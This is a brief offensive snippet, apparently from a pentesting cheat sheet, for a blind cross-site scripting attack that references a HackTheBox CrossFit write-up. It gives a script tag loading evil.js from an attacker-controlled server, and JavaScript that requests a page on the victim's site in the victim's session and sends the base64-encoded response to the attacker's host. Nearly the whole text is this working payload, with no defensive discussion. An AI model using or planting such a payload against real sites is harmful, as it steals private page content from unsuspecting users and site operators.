## BXSS file

```<script src="http://yourServer:PORT/evil.js"></script>```



### Content of JS file

```
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://Victim.com/path/file.php', true);
xhr.setRequestHeader('Content-type', 'application/x-www-urlencoded');

xhr.onload = function () {
	var request = new XMLHttpRequest();
	request.open('GET', 'http://YorServerHere:PORT/?code=' + btoa(xhr.responseText), true);
	request.send();
};

xhr.send();

```


reference: https://xakep.ru/2021/03/22/htb-crossfit-xss/
